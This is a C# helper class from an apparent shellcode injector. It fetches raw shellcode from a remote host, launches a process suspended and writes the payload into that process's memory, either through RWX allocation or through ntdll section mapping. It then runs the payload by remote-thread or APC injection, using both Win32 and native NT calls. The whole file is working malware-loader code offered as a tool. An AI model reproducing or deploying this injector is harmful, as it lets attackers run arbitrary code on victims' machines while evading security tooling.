using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;


namespace Shellcode_Injector
{
    internal class Helpers
    {
        //Fetch the file from remote host
        public static byte[] Fetch(string host, string file)
        {
            Console.WriteLine($"Fetching {file} from {host}");
            WebClient client = new WebClient();
            client.BaseAddress = host;
            byte[] sc = client.DownloadData(file);
            return sc;
        }

        //Create proc and return the process information struct
        public static WinApi.PIN StartS(string cmd = "C:\\Windows\\System32\\notepad.exe", string cwd = "C:\\Windows\\System32")
        {
            //Init structs for create process
            var sin = new WinApi.SIN();
            var pattr = new WinApi.SATTR();
            var tattr = new WinApi.SATTR();
            var pin = new WinApi.PIN();

            sin.cb = Marshal.SizeOf(sin);
            pattr.nLength = Marshal.SizeOf(pattr);
            tattr.nLength = Marshal.SizeOf(tattr);

            //Create process
            bool ok = WinApi.Starter(
                    cmd,
                    null,
                    ref pattr,
                    ref tattr,
                    false,
                    (uint)WinApi.proc.sspnd,
                    IntPtr.Zero,
                    cwd,
                    ref sin,
                    out pin
                );
            if (!ok)
            {
                Console.WriteLine("Error starting proc");
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine($"Proc created with PID {pin.dwProcessId}");
                return pin;
            }
        }

        //Allocate memory and write the shellcode - for CreateRemoteThread or QueueUserAPC
        public static IntPtr MWrite(IntPtr phand, byte[] sc) 
        { 
            IntPtr our_place = WinApi.Allocate(
                phand, 
                IntPtr.Zero, 
                (uint)sc.Length, 
                (uint)WinApi.mem.cmt_rv, 
                (uint)WinApi.mem.rwx);

            WinApi.WriteMem(phand, our_place, sc, (uint)sc.Length, out _);
            WinApi.Protect(phand, our_place, (int)sc.Length, (uint)WinApi.mem.rx, 0);
            return our_place;
        }

        //Allocate memory and write the shellcode trough ntdll.dll functions
        // To be used with NtCreateThreadEx or NtQueueApcThread
        public static IntPtr NTMWrite(IntPtr phand, byte[] sc) 
        {
            var hsec = IntPtr.Zero;
            var sc_size = (ulong)sc.Length;
            //Create new memory block section in the current process
            WinApi.cSection(
                ref hsec,
                (ulong)WinApi.gen.sec_accs,
                IntPtr.Zero,
                ref sc_size,
                (uint)WinApi.mem.rwx,
                (ulong)WinApi.gen.sec_cmt,
                IntPtr.Zero
                );

            //Map the view of the created section into the memory of the current process
            WinApi.mvSection(
                hsec,
                (IntPtr)(-1),   // Will target current Process
                out var laddr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out var _,
                2,             // ViewUnmap (created view will not be inherited by child processes)
                0,
                (uint)WinApi.mem.rw
                );

            //Copy the shellcode
            Marshal.Copy(sc, 0, laddr, sc.Length);

            //Map the created region as RX into the remote process
            WinApi.mvSection(
                hsec,
                phand,
                out var raddr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out _,
                2,
                0,
                (uint)WinApi.mem.rx
                );
            return raddr;
        }

        //Run the shellcode - techniques (CreateRemoteThread, QueueUserAPC), process handle, memory pointer
        //In case of CreateRemoteThread phand should be process Handle
        //In case of QueueUserAPC phand should be the main thread handle
        public static void SCRun(string tchq, IntPtr phand, IntPtr mem) 
        {
            if (tchq == "crt")
            {
                IntPtr rmth = WinApi.RemoteThread(phand, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
                WinApi.Waiter(rmth, (uint)WinApi.mem.end);
            } else if (tchq == "qua") 
            {
                Console.WriteLine("Trying to run the code trough queue user apc");
                WinApi.APC(mem, phand, 0);
                WinApi.Resume(phand);
            }
        }

        //Run the shellcode trough ntdll.dll - techniques (NtCreateThreadEx, NtQueueApcThread)
        //In case of NtCreateThreadEx phand should be process handle
        //In case of NtQueueApcThread phand should be thread handle
        public static void NTSCRun(string tchq, IntPtr phand, IntPtr mem) 
        {
            if (tchq == "ncte")
            {
                WinApi.cThread(
                    out _,
                    (ulong)WinApi.gen.thr_accs,
                    IntPtr.Zero,
                    phand,
                    mem,
                    IntPtr.Zero,
                    false,
                    0,
                    0,
                    0,
                    IntPtr.Zero
                    );
            } else if (tchq == "nqat") 
            {
                WinApi.NAPC(phand, mem, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
        }

        //Get a remote handle
        public static IntPtr GetHand(int id) 
        {
            var proc = Process.GetProcessById(id);
            return proc.Handle;
        }
    }
}
